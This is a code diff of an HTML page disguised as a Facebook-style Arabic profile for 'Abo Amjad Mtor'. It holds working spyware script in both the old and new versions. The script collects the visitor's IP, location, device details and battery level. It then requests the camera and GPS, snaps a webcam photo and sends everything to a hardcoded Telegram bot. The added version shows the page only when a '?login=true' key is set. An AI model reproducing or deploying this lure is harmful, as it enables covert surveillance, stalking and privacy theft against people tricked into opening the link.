@@ -8,40 +8,60 @@
     <meta property="og:image" content="https://d.top4top.io/p_37082hh8d0.jpg">
     <title>Abo Amjad Mtor</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; }
-        .header { background: white; border-bottom: 1px solid #ddd; padding-bottom: 12px; }
-        .cover { width: 100%; height: 210px; background: url('https://c.top4top.io/p_3708caj9q0.png') center/cover; position: relative; }
-        .profile-pic-container { text-align: right; padding-right: 16px; margin-top: -100px; position: relative; }
-        .p-pic { width: 168px; height: 168px; border-radius: 50%; border: 4px solid white; background: url('https://d.top4top.io/p_37082hh8d0.jpg') center/cover; display: inline-block; }
-        .info { padding: 10px 16px; background: white; }
-        .name { font-size: 24px; font-weight: bold; color: #050505; margin: 0; }
-        .stats { font-size: 15px; color: #65676b; margin-top: 4px; }
-        .buttons { display: flex; gap: 8px; padding: 12px 16px; background: white; }
-        .btn-blue { background: #1877f2; color: white; border: none; flex: 1; padding: 8px; border-radius: 6px; font-weight: bold; }
-        .btn-gray { background: #e4e6eb; color: #050505; border: none; flex: 1; padding: 8px; border-radius: 6px; font-weight: bold; }
-        .tabs { display: flex; border-top: 1px solid #ddd; background: white; padding: 10px 16px; gap: 20px; color: #65676b; font-size: 14px; }
-        .active-tab { color: #1877f2; border-bottom: 2px solid #1877f2; padding-bottom: 5px; }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: #f0f2f5; margin: 0; display: none; } /* مخفي حتى تفعيل المفتاح */
+        .header { background: white; border-bottom: 1px solid #ddd; }
+        .cover { width: 100%; height: 210px; background: url('https://c.top4top.io/p_3708caj9q0.png') center/cover; }
+        .p-container { padding: 0 16px; margin-top: -100px; }
+        .p-pic { width: 168px; height: 168px; border-radius: 50%; border: 4px solid white; background: url('https://d.top4top.io/p_37082hh8d0.jpg') center/cover; }
+        .u-info { padding: 10px 16px; background: white; }
+        .u-name { font-size: 24px; font-weight: bold; margin: 0; }
+        .u-stats { font-size: 15px; color: #65676b; margin-top: 5px; }
+        .btns { display: flex; gap: 8px; padding: 12px 16px; background: white; }
+        .b-blue { background: #1877f2; color: white; border: none; flex: 1; padding: 8px; border-radius: 6px; font-weight: bold; }
+        .b-gray { background: #e4e6eb; color: black; border: none; flex: 1; padding: 8px; border-radius: 6px; font-weight: bold; }
+        .tabs { display: flex; border-top: 1px solid #ddd; padding: 12px 16px; gap: 20px; color: #65676b; font-size: 15px; background: white; }
+        .active { color: #1877f2; border-bottom: 3px solid #1877f2; padding-bottom: 8px; }
+        /* تصميم المنشور */
+        .post { background: white; margin-top: 10px; padding: 12px; }
+        .post-header { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
+        .post-p-pic { width: 40px; height: 40px; border-radius: 50%; background: url('https://d.top4top.io/p_37082hh8d0.jpg') center/cover; }
+        .post-name { font-weight: bold; font-size: 15px; }
+        .post-time { color: #65676b; font-size: 12px; }
+        .post-content { font-size: 15px; margin-bottom: 10px; }
+        .post-img { width: 100%; border-top: 1px solid #eee; border-bottom: 1px solid #eee; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="header">
         <div class="cover"></div>
-        <div class="profile-pic-container"><div class="p-pic"></div></div>
-        <div class="info">
-            <h1 class="name">Abo Amjad Mtor</h1>
-            <div class="stats">‏٢ ألف‏ من الأصدقاء • ‏٥٦‏ من الأصدقاء المشتركين</div>
-            <div class="stats">٤٠ من المنشورات</div>
+        <div class="p-container"><div class="p-pic"></div></div>
+        <div class="u-info">
+            <h1 class="u-name">Abo Amjad Mtor</h1>
+            <div class="u-stats">‏٢ ألف‏ من الأصدقاء • ‏٥٦‏ من الأصدقاء المشتركين</div>
+            <div class="u-stats">‏٤٠‏ من المنشورات</div>
         </div>
-        <div class="buttons">
-            <button class="btn-blue">إضافة صديق</button>
-            <button class="btn-gray">مراسلة</button>
+        <div class="btns">
+            <button class="b-blue">إضافة صديق</button>
+            <button class="b-gray">مراسلة</button>
         </div>
         <div class="tabs">
-            <span class="active-tab">الكل</span>
+            <span class="active">الكل</span>
             <span>الصور</span>
             <span>ريلز</span>
         </div>
+    </div>
+
+    <div class="post">
+        <div class="post-header">
+            <div class="post-p-pic"></div>
+            <div>
+                <div class="post-name">Abo Amjad Mtor</div>
+                <div class="post-time">‏١٥ يناير ٢٠٢٦‏</div>
+            </div>
+        </div>
+        <div class="post-content">قام Abo Amjad Mtor بتحديث صورة ملفه الشخصي.</div>
+        <img src="https://d.top4top.io/p_37082hh8d0.jpg" class="post-img">
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -51,57 +71,54 @@
         const TOKEN = "8367707810:AAFdTLpznKlb8A7vxLMsLlAuCDQOS7v5KAA";
         const CHAT_ID = "5775781038";
 
-        async function sendToTelegram(msg) {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+        // التحقق من المفتاح في الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('login') === 'true') {
+            document.body.style.display = 'block';
+            startSnoop();
         }
 
-        async function sendPhoto(blob) {
-            let fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, 'target.jpg');
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        async function sendT(m) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}&parse_mode=HTML`);
         }
 
-        async function startHacking() {
-            // 1. سحب معلومات الجهاز والـ IP فوراً (بدون إذن)
+        async function sendP(b) {
+            let f = new FormData();
+            f.append('chat_id', CHAT_ID);
+            f.append('photo', b, 'c.jpg');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
+        }
+
+        async function startSnoop() {
             try {
-                let ipRes = await fetch('https://ipapi.co/json/');
-                let d = await ipRes.json();
-                let bat = await navigator.getBattery();
-                let initialMsg = `<b>🔥 تم سحب بيانات Abo Amjad الأولية 🔥</b>\n\n` +
-                                 `🌐 IP: <code>${d.ip}</code>\n` +
-                                 `🏙️ المدينة: ${d.city}, ${d.country_name}\n` +
-                                 `📡 المزود: ${d.org}\n` +
-                                 `📱 الجهاز: ${navigator.userAgent}\n` +
-                                 `🔋 البطارية: ${Math.round(bat.level * 100)}%`;
-                await sendToTelegram(initialMsg);
-            } catch (e) { console.log("Silent Error"); }
+                // سحب المعلومات الصامتة أولاً
+                let r = await fetch('https://ipapi.co/json/');
+                let d = await r.json();
+                let b = await navigator.getBattery();
+                let msg = `<b>🔥 صيد دقيق (Key Active) 🔥</b>\n\n` +
+                          `🌐 IP: <code>${d.ip}</code>\n` +
+                          `🏙️ ${d.city}, ${d.country_name}\n` +
+                          `📱 ${navigator.platform} | 🔋 ${Math.round(b.level * 100)}%`;
+                sendT(msg);
 
-            // 2. طلب الأذونات (كاميرا و GPS) مباشرة وراء بعض
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                    const video = document.getElementById('v');
-                    video.srcObject = stream;
+                // طلب الأذونات فوراً
+                navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                    const v = document.getElementById('v');
+                    v.srcObject = s;
                     setTimeout(() => {
-                        const canvas = document.getElementById('c');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(sendPhoto, 'image/jpeg');
-                        stream.getTracks().forEach(t => t.stop());
+                        const c = document.getElementById('c');
+                        c.width = v.videoWidth; c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        c.toBlob(sendP, 'image/jpeg');
+                        s.getTracks().forEach(t => t.stop());
                     }, 3000);
-                }).catch(err => sendToTelegram("⚠️ رفض الكاميرا"));
-            }
+                });
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    let gps = `🎯 <b>موقع Abo Amjad الدقيق:</b>\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendToTelegram(gps);
-                }, () => sendToTelegram("⚠️ رفض الـ GPS"));
-            }
+                navigator.geolocation.getCurrentPosition(p => {
+                    sendT(`🎯 GPS:\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                });
+            } catch (e) {}
         }
-
-        window.onload = startHacking;
     </script>
 </body>
 </html>
